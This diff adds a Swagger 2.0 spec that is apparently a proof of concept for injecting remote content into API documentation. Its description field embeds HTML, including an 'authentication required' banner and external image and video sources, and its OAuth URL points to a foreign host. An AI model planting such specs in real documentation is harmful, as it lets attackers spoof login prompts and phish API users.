@@ -1,0 +1,18 @@
+swagger: '2.0'
+
+securityDefinitions:
+  Authentication:
+    type: oauth2
+    authorizationUrl: http://authorization.site
+
+info:
+  version: "0.0.1"
+  title: Proof-of-Concept for Remote File Inclusion
+  description: <h1>Attention:</h1>Authentication is required to proceed.<br><img src=//t4.ftcdn.net/jpg/01/35/75/99/360_F_135759975_8jLV7hjXaNd9OAXqQdUQ3dj0LgxXPHqO.jpg><video src=//authorization.site>
+
+paths:
+  /:
+    get:
+      responses:
+        200:
+          description: Proof-of-Concept for Remote File Inclusion
